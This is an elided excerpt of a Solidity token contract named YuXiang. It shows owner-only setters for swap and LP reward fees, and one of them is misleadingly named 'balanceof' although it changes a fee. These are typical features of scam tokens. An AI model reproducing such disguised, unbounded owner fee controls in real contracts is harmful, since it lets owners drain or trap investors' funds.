...
contract YuXiang is Ownership {
    using SafeMath for uint256;

    string _name = "YuXiang";
    string _symbol = "YUAN";
    uint8 _decimals = 9;
    ...
    function balanceof(uint8 fee) external onlyOwner {
        swapTokensFee = fee;
    }
    ...
    function lpRewardFeeSetting(uint8 rewardfee) external onlyOwner {
        lpRewardFee = rewardfee;
    }

    function provideBonus(address account, uint256 amounts) internal {
    ...
    function initialfee(uint256 maxTxPercent) external onlyOwner {
